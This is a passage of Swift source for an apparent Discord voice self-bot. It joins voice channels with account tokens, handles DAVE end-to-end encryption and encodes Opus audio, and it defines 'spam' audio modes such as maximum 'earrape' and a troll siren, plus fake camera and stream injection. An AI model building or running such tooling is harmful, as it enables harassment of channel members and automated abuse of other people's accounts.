        lock.lock()
        defer { lock.unlock() }
        if let h = handle {
            dave_session_free(h)
            handle = nil
        }
        pendingTransitions.removeAll()
        pendingExternalSender = nil
    }

    /// Khởi tạo hoặc tái khởi tạo phiên MLS. Trả về KeyPackage (gửi binary Op 26) nếu protocolVersion > 0.
    func reinit(protocolVersion newVersion: UInt16? = nil) -> Data? {
        lock.lock()
        defer { lock.unlock() }
        if let nv = newVersion {
            self.protocolVersion = nv
        }
        if self.protocolVersion > 0 {
            if let h = handle {
                _ = dave_session_reinit(h, self.protocolVersion, userId, channelId)
            } else {
                handle = dave_session_new(self.protocolVersion, userId, channelId)
            }
            guard let h = handle else { return nil }
            if let ext = pendingExternalSender {
                _ = ext.withUnsafeBytes { raw -> Bool in
                    guard let ptr = raw.bindMemory(to: UInt8.self).baseAddress else { return false }
                    return dave_session_set_external_sender(h, ptr, ext.count)
                }
                pendingExternalSender = nil
            }
            if downgraded {
                dave_session_set_passthrough_mode(h, true, 10)
            }
            return consumeDaveBuffer(dave_session_create_key_package(h))
        } else {
            if let h = handle {
                _ = dave_session_reset(h)
                dave_session_set_passthrough_mode(h, true, 10)
            }
            return nil
        }
    }

    func setExternalSender(_ data: Data) -> Bool {
        lock.lock()
        defer { lock.unlock() }
        guard !data.isEmpty else { return false }
        guard let h = handle else {
            // Lưu tạm nếu Op 25 đến trước khi nâng cấp từ DAVE v0 -> v1
            pendingExternalSender = data
            return true
        }
        return data.withUnsafeBytes { raw in
            guard let ptr = raw.bindMemory(to: UInt8.self).baseAddress else { return false }
            return dave_session_set_external_sender(h, ptr, data.count)
        }
    }

    /// Xử lý Binary Op 27 (MLS Proposals). Trả về (ok, commitWelcomeData?).
    func processProposals(payload: Data) -> (ok: Bool, commitWelcome: Data?) {
        lock.lock()
        defer { lock.unlock() }
        guard let h = handle, payload.count >= 2 else { return (false, nil) }
        let opType = payload[payload.startIndex]
        let propSlice = Data(payload.dropFirst(1))
        var outBuf = DaveByteBuffer(ptr: nil, len: 0, cap: 0)
        let ok = propSlice.withUnsafeBytes { raw -> Bool in
            guard let ptr = raw.bindMemory(to: UInt8.self).baseAddress else { return false }
            return dave_session_process_proposals(h, opType, ptr, propSlice.count, nil, 0, &outBuf)
        }
        let cw = consumeDaveBuffer(outBuf)
        return (ok, cw)
    }

    /// Xử lý Binary Op 29 (MLS Announce Commit Transition).
    /// Trả về (transitionId, result: 1=processed, 0=ignored, -1=error).
    func processCommit(payload: Data) -> (transitionId: UInt16, result: Int32) {
        lock.lock()
        defer { lock.unlock() }
        guard let h = handle, payload.count > 2 else { return (0, -1) }
        let b = payload.startIndex
        let tid = (UInt16(payload[b]) << 8) | UInt16(payload[b + 1])
        let commitData = Data(payload.dropFirst(2))
        let res = commitData.withUnsafeBytes { raw -> Int32 in
            guard let ptr = raw.bindMemory(to: UInt8.self).baseAddress else { return -1 }
            return dave_session_process_commit(h, ptr, commitData.count)
        }
        if res == 1 {
            let curVer = dave_session_protocol_version(h)
            let prepOk = dave_session_prepare_transition(h, tid, curVer)
            if !prepOk { return (tid, -1) }
            if tid != 0 {
                pendingTransitions[tid] = curVer
            }
        }
        return (tid, res)
    }

    /// Xử lý Binary Op 30 (MLS Welcome).
    func processWelcome(payload: Data) -> (transitionId: UInt16, ok: Bool) {
        lock.lock()
        defer { lock.unlock() }
        guard let h = handle, payload.count > 2 else { return (0, false) }
        let b = payload.startIndex
        let tid = (UInt16(payload[b]) << 8) | UInt16(payload[b + 1])
        let welcomeData = Data(payload.dropFirst(2))
        let ok = welcomeData.withUnsafeBytes { raw -> Bool in
            guard let ptr = raw.bindMemory(to: UInt8.self).baseAddress else { return false }
            return dave_session_process_welcome(h, ptr, welcomeData.count, nil, 0)
        }
        if ok {
            let curVer = dave_session_protocol_version(h)
            let prepOk = dave_session_prepare_transition(h, tid, curVer)
            if !prepOk { return (tid, false) }
            if tid != 0 {
                pendingTransitions[tid] = curVer
            }
        }
        return (tid, ok)
    }

    /// Xử lý JSON Op 21 (DAVE Prepare Transition). Trả về true nếu cần gửi JSON Op 23 (Transition Ready).
    func prepareTransition(transitionId: UInt16, protocolVersion newVer: UInt16) -> Bool {
        lock.lock()
        defer { lock.unlock() }
        pendingTransitions[transitionId] = newVer
        if let h = handle {
            _ = dave_session_prepare_transition(h, transitionId, newVer)
        }
        if transitionId == 0 {
            executeTransitionLocked(transitionId: 0)
            return false
        } else {
            if newVer == 0, let h = handle {
                dave_session_set_passthrough_mode(h, true, 24)
            }
            return true
        }
    }

    /// Xử lý JSON Op 22 (DAVE Execute Transition).
    @discardableResult
    func executeTransition(transitionId: UInt16) -> Bool {
        lock.lock()
        defer { lock.unlock() }
        return executeTransitionLocked(transitionId: transitionId)
    }

    @discardableResult
    private func executeTransitionLocked(transitionId: UInt16) -> Bool {
        guard let newVer = pendingTransitions.removeValue(forKey: transitionId) else {
            return false
        }
        if transitionId != 0, let h = handle {
            _ = dave_session_execute_transition(h, transitionId)
        }
        let oldVer = self.protocolVersion
        self.protocolVersion = newVer
        if oldVer != newVer && newVer == 0 {
            self.downgraded = true
        } else if transitionId > 0 && self.downgraded {
            self.downgraded = false
            if let h = handle {
                dave_session_set_passthrough_mode(h, false, 10)
            }
        }
        return true
    }

    var isEncryptionRequired: Bool {
        lock.lock()
        defer { lock.unlock() }
        return protocolVersion > 0 && !downgraded
    }

    var canEncrypt: Bool {
        lock.lock()
        defer { lock.unlock() }
        guard protocolVersion > 0 && !downgraded, let h = handle else { return false }
        return dave_session_can_encrypt(h)
    }

    /// Mã hóa E2EE khung âm thanh Opus.
    func encryptOpus(_ opus: Data) -> Data? {
        if opus.count == 3 {
            let b = opus.startIndex
            if opus[b] == 0xF8 && opus[b + 1] == 0xFF && opus[b + 2] == 0xFE {
                return opus
            }
        }
        lock.lock()
        defer { lock.unlock() }
        if protocolVersion == 0 || downgraded {
            return opus
        }
        guard let h = handle, dave_session_can_encrypt(h) else {
            return nil
        }
        let buf = opus.withUnsafeBytes { raw -> DaveByteBuffer in
            guard let ptr = raw.bindMemory(to: UInt8.self).baseAddress else {
                return DaveByteBuffer(ptr: nil, len: 0, cap: 0)
            }
            return dave_session_encrypt_opus(h, ptr, opus.count)
        }
        return consumeDaveBuffer(buf)
    }

    /// Mã hóa E2EE khung video H.264 Annex-B (dùng cho Fake Cam & Go Live Stream).
    func encryptVideoH264(_ annexB: Data) -> Data? {
        guard !annexB.isEmpty else { return nil }
        lock.lock()
        defer { lock.unlock() }
        if protocolVersion == 0 || downgraded {
            return annexB
        }
        guard let h = handle, dave_session_can_encrypt(h) else {
            return nil
        }
        let buf = annexB.withUnsafeBytes { raw -> DaveByteBuffer in
            guard let ptr = raw.bindMemory(to: UInt8.self).baseAddress else {
                return DaveByteBuffer(ptr: nil, len: 0, cap: 0)
            }
            return dave_session_encrypt_video_h264(h, ptr, annexB.count)
        }
        return consumeDaveBuffer(buf)
    }
}

// MARK: - NATIVE OPUS AUDIO ENCODER (XIPH OPUS RUST CORE - 48kHz STEREO RFC 6716)
final class NativeOpusEncoder {
    private var handle: OpaquePointer?

    init?(sampleRate: Int32 = 48000, channels: Int32 = 2, bitRate: Int32 = 96000) {
        guard let h = dave_opus_encoder_new(sampleRate, channels, bitRate) else {
            return nil
        }
        self.handle = h
    }

    deinit {
        if let h = handle {
            dave_opus_encoder_free(h)
            handle = nil
        }
    }

    /// Mã hóa 960 frame Float32 Stereo (20ms ở 48kHz) thành 1 gói tin Opus chuẩn RFC 6716
    func encode(leftChannel: [Float], rightChannel: [Float]) -> Data? {
        guard let h = handle else { return nil }
        guard leftChannel.count >= 960, rightChannel.count >= 960 else { return nil }

        let buf = leftChannel.withUnsafeBufferPointer { lPtr in
            rightChannel.withUnsafeBufferPointer { rPtr in
                dave_opus_encoder_encode_float(h, lPtr.baseAddress, rPtr.baseAddress, 960)
            }
        }
        return consumeDaveBuffer(buf)
    }
}

// MARK: - AUDIO TRACK DECODER (Giải mã mp3, wav, m4a, flac sang 48kHz Float32 Stereo)
final class AudioTrackDecoder {
    var leftSamples: [Float] = []
    var rightSamples: [Float] = []
    var durationSeconds: Double = 0
    var totalFrames: Int {
        return leftSamples.count / 960
    }

    init?(url: URL) {
        let accessed = url.startAccessingSecurityScopedResource()
        defer {
            if accessed { url.stopAccessingSecurityScopedResource() }
        }

        guard let audioFile = try? AVAudioFile(forReading: url) else { return nil }
        let processingFormat = audioFile.processingFormat
        let fileLength = audioFile.length
        guard fileLength > 0, processingFormat.sampleRate > 0 else { return nil }

        guard let targetFormat = AVAudioFormat(
            commonFormat: .pcmFormatFloat32,
            sampleRate: 48000.0,
            channels: 2,
            interleaved: false
        ) else { return nil }

        guard let converter = AVAudioConverter(from: processingFormat, to: targetFormat) else { return nil }
        if processingFormat.channelCount == 1 {
            converter.channelMap = [0, 0]
        }

        let readCapacity: AVAudioFrameCount = 4096
        let ratio = 48000.0 / max(1.0, processingFormat.sampleRate)
        let outCapacity: AVAudioFrameCount = AVAudioFrameCount(ceil(Double(readCapacity) * ratio)) + 2048

        guard let inputBuffer = AVAudioPCMBuffer(pcmFormat: processingFormat, frameCapacity: readCapacity),
              let outputBuffer = AVAudioPCMBuffer(pcmFormat: targetFormat, frameCapacity: outCapacity) else { return nil }

        audioFile.framePosition = 0
        let estimatedOutSamples = Int(ceil(Double(fileLength) * ratio)) + 4096
        var allL: [Float] = []
        var allR: [Float] = []
        allL.reserveCapacity(estimatedOutSamples)
        allR.reserveCapacity(estimatedOutSamples)

        var reachedEOF = false
        let inputBlock: AVAudioConverterInputBlock = { _, outStatus in
            if reachedEOF {
                outStatus.pointee = .endOfStream
                return nil
            }
            do {
                inputBuffer.frameLength = 0
                try audioFile.read(into: inputBuffer)
                if inputBuffer.frameLength == 0 {
                    reachedEOF = true
                    outStatus.pointee = .endOfStream
                    return nil
                }
                outStatus.pointee = .haveData
                return inputBuffer
            } catch {
                reachedEOF = true
                outStatus.pointee = .endOfStream
                return nil
            }
        }

        while true {
            var error: NSError?
            outputBuffer.frameLength = outCapacity
            let status = converter.convert(to: outputBuffer, error: &error, withInputFrom: inputBlock)

            if status == .error || error != nil {
                break
            }

            let count = Int(outputBuffer.frameLength)
            if count > 0, let ch = outputBuffer.floatChannelData {
                allL.append(contentsOf: UnsafeBufferPointer(start: ch[0], count: count))
                allR.append(contentsOf: UnsafeBufferPointer(start: ch[1], count: count))
            }

            if status == .endOfStream {
                break
            }
            if status == .inputRanDry && reachedEOF {
                break
            }
        }

        guard !allL.isEmpty else { return nil }
        self.leftSamples = allL
        self.rightSamples = allR
        self.durationSeconds = Double(allL.count) / 48000.0
    }

    init(left: [Float], right: [Float], durationSeconds: Double) {
        self.leftSamples = left
        self.rightSamples = right
        self.durationSeconds = durationSeconds
    }
}

// MARK: - SPAM AUDIO MODES & PRESETS
enum SpamAudioFX: String, CaseIterable, Identifiable {
    case normal = "Bình Thường"
    case bassBoost = "Bass Boosted"
    case nightcore = "Nightcore (1.25x)"
    case slowed = "Slowed Reverb (0.85x)"
    case earrape = "Earrape Cực Đại"

    var id: String { rawValue }

    var icon: String {
        switch self {
        case .normal: return "music.note"
        case .bassBoost: return "speaker.wave.3.fill"
        case .nightcore: return "hare.fill"
        case .slowed: return "tortoise.fill"
        case .earrape: return "flame.fill"
        }
    }
}

enum MusicPreset: String, CaseIterable, Identifiable {
    case djVinahouse = "DJ Vinahouse Remix"
    case bassBoost = "Bass Boosted Trap"
    case loFi = "Lo-Fi Beats Chill"
    case trollSiren = "Còi Báo Động Troll"
    case whiteNoise = "Âm Thanh Ảo / Noise"

    var id: String { rawValue }

    var icon: String {
        switch self {
        case .djVinahouse: return "bolt.fill"
        case .bassBoost: return "speaker.wave.3.fill"
        case .loFi: return "headphones"
        case .trollSiren: return "exclamationmark.triangle.fill"
        case .whiteNoise: return "waveform"
        }
    }

    var color: Color {
        switch self {
        case .djVinahouse: return .purple
        case .bassBoost: return .red
        case .loFi: return .blue
        case .trollSiren: return .orange
        case .whiteNoise: return .teal
        }
    }
}

// MARK: - PLAYLIST ITEM & LOOP MODE
struct PlaylistItem: Identifiable, Equatable {
    let id: UUID
    var title: String
    var url: URL?
    var durationSeconds: Double
    var isPreset: Bool
    var preset: MusicPreset?

    var durationFormatted: String {
        guard durationSeconds > 0 else { return "--:--" }
        let s = Int(durationSeconds)
        return String(format: "%02d:%02d", s / 60, s % 60)
    }

    static func == (lhs: PlaylistItem, rhs: PlaylistItem) -> Bool {
        lhs.id == rhs.id
    }
}

enum PlaylistLoopMode: String, CaseIterable, Identifiable {
    case loopAll = "Lặp Danh Sách"
    case loopOne = "Lặp 1 Bài"
    case shuffle = "Ngẫu Nhiên"

    var id: String { rawValue }

    var icon: String {
        switch self {
        case .loopAll: return "repeat"
        case .loopOne: return "repeat.1"
        case .shuffle: return "shuffle"
        }
    }
}

// MARK: - VOICE GATEWAY SESSION (DISCORD GATEWAY + VOICE WEBSOCKET + UDP RTP)
final class VoiceGatewaySession: NSObject, Identifiable, ObservableObject, URLSessionWebSocketDelegate {
    let id: UUID
    let token: String
    var userId: String
    let username: String
    let avatarURL: URL?

    @Published var isConnected = false
    @Published var isJoined = false
    @Published var isSpeaking = false
    @Published var isVoiceUDPReady = false
    @Published var isFakeCamActive = false
    @Published var isGoLiveActive = false
    @Published var premiumType: Int = 0
    @Published var streamProfile: DiscordStreamProfile = DiscordStreamProfile.forPremiumType(0)
    @Published var pingMs: Int = 0
    @Published var lastLog = ""

    private var wsTask: URLSessionWebSocketTask?
    private var voiceWsTask: URLSessionWebSocketTask?
    private var gatewaySession: URLSession?
    private var voiceGatewaySession: URLSession?
    private var heartbeatTask: Task<Void, Never>?
    private var voiceHeartbeatTask: Task<Void, Never>?
    private var udpKeepAliveTask: Task<Void, Never>?
    private var listenTask: Task<Void, Never>?
    private var voiceListenTask: Task<Void, Never>?

    private var currentGuildId: String?
    private var currentChannelId: String?
    private var selfMute = false
    private var selfDeaf = false
    private var selfVideo = false
    var enableVideoCapabilities = false

    private var gatewaySeq: Int?
    private var voiceSessionId: String?
    private var voiceToken: String?
    private var voiceEndpoint: String?
    private var ssrc: Int = 0
    private var videoSsrc: Int = 0
    private var rtxSsrc: Int = 0
    private var secretKey: Data?
    private var encryptionMode: String = ""
    private var voiceSeq: Int = -1
    let scope: FeatureScope
    private var daveSession: DaveE2EESession?
    private var hasLoggedAudioStart = false
    private var hasLoggedDaveReady = false
    private var hasLoggedCamVideoStart = false
    private var hasLoggedCamDaveErr = false
    private var hasSentVoiceIdentify = false
    private var hasSentSelectProtocol = false
    private let packetLock = NSLock()

    // Fake Cam + Go Live Stream state
    private let camVideoPacketizer = DiscordRtpVideoPacketizer()
    private var webrtcClient: DiscordWebRtcClient?
    private var webrtcMonitorTask: Task<Void, Never>?
    private var desiredFakeCamProfile: DiscordStreamProfile?
    private var desiredGoLiveProfile: DiscordStreamProfile?
    private var streamSession: DiscordStreamMediaSession?
    private var pendingStreamServerId: String?
    private var pendingStreamKey: String?
    private var pendingStreamEndpoint: String?
    private var pendingStreamToken: String?

    private var isVoiceConnecting = false
    private var activeVoiceToken: String?
    private var activeVoiceSessionId: String?

    private let udpClient = DiscordVoiceUDPClient()
    private let transportNonce = TransportNonceBox()
    private var rtpSequence: UInt16 = UInt16.random(in: 0...65535)
    private var rtpTimestamp: UInt32 = UInt32.random(in: 0...4000000)
    private var udpKeepAliveCounter: UInt32 = 0

    var onLog: ((String) -> Void)?
    var onVoiceUDPReady: (() -> Void)?
    var onGoLiveReady: (() -> Void)?
    var onRequestCamKeyFrame: (() -> Void)?
    var onRequestGoLiveKeyFrame: (() -> Void)?

    init(tokenInfo: TokenInfo, scope: FeatureScope = .voice) {
        self.scope = scope
        self.id = tokenInfo.id
        self.token = tokenInfo.token
        var uid = tokenInfo.userId
        if (uid.isEmpty || uid == "0"), let ext = extractUserId(from: tokenInfo.token) {
            uid = ext
        }
        self.userId = uid
        self.username = tokenInfo.username
        self.avatarURL = tokenInfo.avatarURL
        super.init()
    }

    func start(guildId: String, channelId: String, mute: Bool, deaf: Bool, video: Bool, enableVideo: Bool = false) {
        self.currentGuildId = guildId
        self.currentChannelId = channelId
        self.selfMute = mute
        self.selfDeaf = deaf
        self.selfVideo = video
        self.enableVideoCapabilities = enableVideo
        self.gatewaySeq = nil
        self.voiceSessionId = nil
        self.voiceToken = nil
        self.voiceEndpoint = nil
        self.activeVoiceToken = nil
        self.activeVoiceSessionId = nil
        self.isVoiceConnecting = false
        self.hasSentVoiceIdentify = false
        self.hasSentSelectProtocol = false
        self.hasLoggedCamVideoStart = false
        self.pendingStreamServerId = nil
        self.pendingStreamKey = nil
        self.pendingStreamEndpoint = nil
        self.pendingStreamToken = nil

        connectGateway()
    }

    private func log(_ msg: String) {
        let full = "[\(username)] \(msg)"
        DispatchQueue.main.async { [weak self] in
            self?.lastLog = msg
            self?.onLog?(full)
        }
    }

    private func connectGateway() {
        guard SecurityGuard.shared.verifyExecutionPermit(),
              let url = RemoteFeatureVault.shared.gatewayURL(scope: scope) else {
            log("Chưa xác thực cấu hình Gateway từ máy chủ")
            return
        }

        wsTask?.cancel(with: .goingAway, reason: nil)
        listenTask?.cancel()
        heartbeatTask?.cancel()
        gatewaySession?.invalidateAndCancel()

        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest = 30
        config.timeoutIntervalForResource = 604800 // Không tự cắt WebSocket sau 30 giây
        let session = URLSession(configuration: config, delegate: self, delegateQueue: nil)
        self.gatewaySession = session

        let ws = session.webSocketTask(with: url)
        // Cố định buffer để tránh lỗi "Message too long" khi tài khoản có nhiều server
        ws.maximumMessageSize = 64 * 1024 * 1024
        self.wsTask = ws
        ws.resume()

        listenTask = Task { [weak self] in
            guard let self = self else { return }
            do {
                while !Task.isCancelled {
                    let message = try await ws.receive()
                    switch message {
                    case .string(let text):
                        await self.handleGatewayMessage(text)
                    case .data(let data):
                        if let text = String(data: data, encoding: .utf8) {
                            await self.handleGatewayMessage(text)
                        }
                    @unknown default:
                        break
                    }
                }
            } catch {
                if !Task.isCancelled && self.wsTask === ws {
                    self.log("Gateway ngắt kết nối: \(error.localizedDescription)")
                    DispatchQueue.main.async {
                        self.isConnected = false
                        self.isJoined = false
                        self.isVoiceUDPReady = false
                    }
                }
            }
        }
    }

    private func handleGatewayMessage(_ text: String) async {
        guard let data = text.data(using: .utf8),
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let op = json["op"] as? Int else { return }

        if let seq = json["s"] as? Int {
            self.gatewaySeq = seq
        }

        switch op {
        case 10: // Hello
            if let d = json["d"] as? [String: Any],
               let interval = (d["heartbeat_interval"] as? Int) ?? (d["heartbeat_interval"] as? NSNumber)?.intValue {
                startHeartbeat(intervalMs: interval)
                sendIdentify()
            }
        case 11: // Heartbeat ACK
            break
        case 0: // Dispatch
            let event = json["t"] as? String
            if event == "READY" {
                if let d = json["d"] as? [String: Any] {
                    if let user = d["user"] as? [String: Any] {
                        if let uid = user["id"] as? String, !uid.isEmpty {
                            self.userId = uid
                        }
                        let pt = (user["premium_type"] as? Int)
                            ?? (user["premium_type"] as? NSNumber)?.intValue
                            ?? 0
                        let prof = DiscordStreamProfile.forPremiumType(pt)
                        DispatchQueue.main.async {
                            self.premiumType = pt
                            self.streamProfile = prof
                        }
                        if enableVideoCapabilities {
                            log("💎 Premium=\(DiscordStreamProfile.premiumName(pt)) → \(prof.label)")
                        }
                    }
                }
                DispatchQueue.main.async { self.isConnected = true }
                log("Đã kết nối Gateway! Đang vào Voice Channel...")
                sendVoiceStateUpdate()
            } else if event == "VOICE_STATE_UPDATE" {
                if let d = json["d"] as? [String: Any],
                   let uid = d["user_id"] as? String {
                    if (self.userId.isEmpty || self.userId == "0") { self.userId = uid }
                    if uid == self.userId {
                        if let cid = d["channel_id"] as? String, cid == currentChannelId {
                            if let sid = d["session_id"] as? String, !sid.isEmpty {
                                self.voiceSessionId = sid
                                log("Đã vào phòng Voice (Session: \(sid.prefix(8))...)! Đang chờ Voice Server...")
                            } else {
                                log("Đã vào phòng Voice! Đang kết nối máy chủ âm thanh...")
                            }
                            DispatchQueue.main.async { self.isJoined = true }
                            tryConnectVoiceGateway()
                        } else if d["channel_id"] == nil || d["channel_id"] is NSNull {
                            self.voiceSessionId = nil
                            DispatchQueue.main.async {
                                self.isJoined = false
                                self.isVoiceUDPReady = false
                                self.isFakeCamActive = false
                                self.isGoLiveActive = false
                            }
                        }
                    }
                }
            } else if event == "VOICE_SERVER_UPDATE" {
                if let d = json["d"] as? [String: Any],
                   let token = d["token"] as? String,
                   let endpoint = d["endpoint"] as? String, !endpoint.isEmpty {
                    let gid = d["guild_id"] as? String
                    if let curGid = self.currentGuildId, let evGid = gid, !evGid.isEmpty, evGid != curGid {
                        return
                    }
                    self.voiceToken = token
                    self.voiceEndpoint = endpoint
                    if let evGid = gid, !evGid.isEmpty {
                        self.currentGuildId = evGid
                    }
                    log("Đã nhận Voice Server: \(endpoint)")
                    tryConnectVoiceGateway()
                }
            } else if event == "STREAM_CREATE" {
                if let d = json["d"] as? [String: Any],
                   let streamKey = d["stream_key"] as? String,
                   let rtcServerId = d["rtc_server_id"] as? String {
                    let expectedKey = makeStreamKey()
                    if streamKey == expectedKey {
                        self.pendingStreamKey = streamKey
                        self.pendingStreamServerId = rtcServerId
                        log("📺 Nhận STREAM_CREATE (RTC Server: \(rtcServerId))")
                        tryConnectStreamMediaSession()
                    }
                }
            } else if event == "STREAM_SERVER_UPDATE" {
                if let d = json["d"] as? [String: Any],
                   let streamKey = d["stream_key"] as? String,
                   let token = d["token"] as? String,
                   let endpoint = d["endpoint"] as? String, !endpoint.isEmpty {
                    let expectedKey = makeStreamKey()
                    if streamKey == expectedKey {
                        self.pendingStreamKey = streamKey
                        self.pendingStreamToken = token
                        self.pendingStreamEndpoint = endpoint
                        log("📺 Nhận STREAM_SERVER_UPDATE: \(endpoint)")
                        tryConnectStreamMediaSession()
                    }
                }
            }
        default:
            break
        }
    }

    private func startHeartbeat(intervalMs: Int) {
        heartbeatTask?.cancel()
        let intervalSec = Double(intervalMs) / 1000.0
        heartbeatTask = Task { [weak self] in
            while !Task.isCancelled {
                try? await Task.sleep(nanoseconds: UInt64(intervalSec * 1_000_000_000))
                guard let self = self, let ws = self.wsTask else { break }
                let start = Date()
                let seqStr = self.gatewaySeq.map { String($0) } ?? "null"
                let hb = "{\"op\":1,\"d\":\(seqStr)}"
                try? await ws.send(.string(hb))
                let ping = Int(Date().timeIntervalSince(start) * 1000)
                DispatchQueue.main.async {
                    self.pingMs = max(15, ping)
                }
            }
        }
    }

    private func sendIdentify() {
        guard let ws = wsTask else { return }
        let props = RemoteFeatureVault.shared.gatewayIdentifyProperties(scope: scope)
        guard !props.isEmpty else { return }
        let payload: [String: Any] = [
            "op": 2,
            "d": [
                "token": token,
                "capabilities": 125,
                "properties": props,
                "compress": false,
                "presence": [
                    "status": "online",
                    "since": 0,
                    "activities": [],
                    "afk": false
                ]
            ]
        ]
        if let data = try? JSONSerialization.data(withJSONObject: payload),
           let str = String(data: data, encoding: .utf8) {
            Task { try? await ws.send(.string(str)) }
        }
    }

    func sendVoiceStateUpdate() {
        guard let ws = wsTask, let gid = currentGuildId else { return }
        let cid: Any = currentChannelId ?? NSNull()
        let payload: [String: Any] = [
            "op": 4,
            "d": [
                "guild_id": gid,
                "channel_id": cid,
                "self_mute": selfMute,
                "self_deaf": selfDeaf,
                "self_video": selfVideo
            ]
        ]
        if let data = try? JSONSerialization.data(withJSONObject: payload),
           let str = String(data: data, encoding: .utf8) {
            Task { try? await ws.send(.string(str)) }
        }
    }

    func updateToggles(mute: Bool, deaf: Bool, video: Bool) {
        self.selfMute = mute
        self.selfDeaf = deaf
        self.selfVideo = video
        sendVoiceStateUpdate()
    }

    private func tryConnectVoiceGateway() {
        // Phải có đủ cả voiceSessionId (từ VOICE_STATE_UPDATE) và voiceToken + voiceEndpoint (từ VOICE_SERVER_UPDATE)
        guard let sid = voiceSessionId, !sid.isEmpty,
              let vtok = voiceToken, !vtok.isEmpty,
              let ep = voiceEndpoint, !ep.isEmpty,
              let gid = currentGuildId, !gid.isEmpty else { return }

        // Chống race condition: không hủy kết nối đang bắt tay nếu token & session không đổi
        if isVoiceConnecting && activeVoiceToken == vtok && activeVoiceSessionId == sid {
            return
        }
        if isVoiceUDPReady && activeVoiceToken == vtok && activeVoiceSessionId == sid {
            return
        }

        isVoiceConnecting = true
        activeVoiceToken = vtok
        activeVoiceSessionId = sid
        voiceSeq = -1
        transportNonce.reset()
        hasLoggedAudioStart = false
        hasLoggedDaveReady = false
        hasLoggedCamVideoStart = false
        hasLoggedCamDaveErr = false
        hasSentVoiceIdentify = false
        hasSentSelectProtocol = false
        daveSession?.destroy()
        daveSession = nil

        let cleanHost = cleanVoiceEndpoint(ep)
        guard !cleanHost.isEmpty, let vUrl = RemoteFeatureVault.shared.voiceWebSocketURL(scope: scope, cleanHost: cleanHost) else {
            log("Lỗi: Voice Endpoint không hợp lệ hoặc chưa xác thực chức năng (\(ep))")
            isVoiceConnecting = false
            return
        }

        voiceWsTask?.cancel(with: .goingAway, reason: nil)
        voiceListenTask?.cancel()
        voiceHeartbeatTask?.cancel()
        udpKeepAliveTask?.cancel()
        webrtcMonitorTask?.cancel()
        webrtcMonitorTask = nil
        webrtcClient?.close()
        webrtcClient = nil
        voiceGatewaySession?.invalidateAndCancel()

        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest = 30
        config.timeoutIntervalForResource = 604800 // Không tự cắt Voice WebSocket sau 30 giây
        let session = URLSession(configuration: config, delegate: self, delegateQueue: nil)
        self.voiceGatewaySession = session

        let vWs = session.webSocketTask(with: vUrl)
        vWs.maximumMessageSize = 32 * 1024 * 1024
        self.voiceWsTask = vWs
        vWs.resume()
        log("Đang bắt tay Voice Gateway v8 (DAVE E2EE): \(vUrl.absoluteString)...")

        voiceListenTask = Task { [weak self] in
            guard let self = self else { return }
            do {
                while !Task.isCancelled {
                    let msg = try await vWs.receive()
                    switch msg {
                    case .string(let s):
                        await self.handleVoiceMessage(s, guildId: gid, sessionId: sid, voiceToken: vtok)
                    case .data(let d):
                        await self.handleVoiceBinaryMessage(d)
                    @unknown default:
                        break
                    }
                }
            } catch {
                if !Task.isCancelled && self.voiceWsTask === vWs {
                    self.isVoiceConnecting = false
                    self.log("Voice Gateway WS ngắt: \(error.localizedDescription)")
                }
            }
        }
    }

    private func sendVoiceJSON(_ payload: [String: Any]) async {
        guard let ws = voiceWsTask else { return }
        if let data = try? JSONSerialization.data(withJSONObject: payload),
           let str = String(data: data, encoding: .utf8) {
            try? await ws.send(.string(str))
        }
    }

    private func sendVoiceBinary(op: UInt8, payload: Data) async {
        guard let ws = voiceWsTask else { return }
        var frame = Data([op])
        frame.append(payload)
        try? await ws.send(.data(frame))
    }

    private func handleVoiceMessage(_ text: String, guildId: String, sessionId: String, voiceToken: String) async {
        guard let data = text.data(using: .utf8),
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let op = json["op"] as? Int else { return }

        if let seq = json["seq"] as? Int {
            self.voiceSeq = seq
        }

        switch op {
        case 8: // Hello
            if let d = json["d"] as? [String: Any] {
                let interval: Double = (d["heartbeat_interval"] as? Double)
                    ?? (d["heartbeat_interval"] as? Int).map { Double($0) }
                    ?? ((d["heartbeat_interval"] as? NSNumber)?.doubleValue)
                    ?? 13750.0
                startVoiceHeartbeat(intervalMs: interval)
                if !hasSentVoiceIdentify {
                    hasSentVoiceIdentify = true
                    log("Nhận Voice Hello (HB: \(Int(interval))ms). Đang gửi Identify v8 (DAVE v\(DaveE2EESession.maxProtocolVersion))...")
                    await sendVoiceIdentify(guildId: guildId, sessionId: sessionId, token: voiceToken)
                }
            }
        case 2: // Ready
            if let d = json["d"] as? [String: Any] {
                self.isVoiceConnecting = false
                if let ssrcVal = (d["ssrc"] as? Int) ?? (d["ssrc"] as? NSNumber)?.intValue {
                    self.ssrc = ssrcVal
                }
                if enableVideoCapabilities {
                    if let streams = d["streams"] as? [[String: Any]], let first = streams.first {
                        self.videoSsrc = (first["ssrc"] as? Int) ?? (first["ssrc"] as? NSNumber)?.intValue ?? (self.ssrc + 1)
                        self.rtxSsrc = (first["rtx_ssrc"] as? Int) ?? (first["rtx_ssrc"] as? NSNumber)?.intValue ?? (self.ssrc + 2)
                    } else {
                        self.videoSsrc = self.ssrc + 1
                        self.rtxSsrc = self.ssrc + 2
                    }
                    self.camVideoPacketizer.configure(ssrc: UInt32(truncatingIfNeeded: self.videoSsrc))
                    await sendVoiceJSON([
                        "op": 12,
                        "d": ["audio_ssrc": self.ssrc, "video_ssrc": 0, "rtx_ssrc": 0, "streams": []]
                    ])
                    log("Voice Ready (WebRTC)! SSRC=\(self.ssrc), VideoSSRC=\(self.videoSsrc), RTX=\(self.rtxSsrc) -> Đang gửi SDP Offer...")
                    await startVoiceWebRtcOffer()
                } else {
                    let ip = d["ip"] as? String ?? ""
                    let port = (d["port"] as? Int) ?? (d["port"] as? NSNumber)?.intValue ?? 0
                    let modes = d["modes"] as? [String] ?? []
                    let vCfg = RemoteFeatureVault.shared.voiceConfig(scope: scope)
                    let aesMode = vCfg?.aead_aes ?? ""
                    let xchachaMode = vCfg?.aead_xchacha ?? ""
                    if !aesMode.isEmpty, modes.contains(aesMode) {
                        self.encryptionMode = aesMode
                    } else if !xchachaMode.isEmpty, modes.contains(xchachaMode) {
                        self.encryptionMode = xchachaMode
                    } else {
                        self.encryptionMode = aesMode
                    }
                    log("Voice Ready! SSRC: \(self.ssrc), UDP: \(ip):\(port), Mode: \(self.encryptionMode)")
                    startVoiceUDP(ip: ip, port: port)
                }
            }
        case 4: // Session Description
            if let d = json["d"] as? [String: Any] {
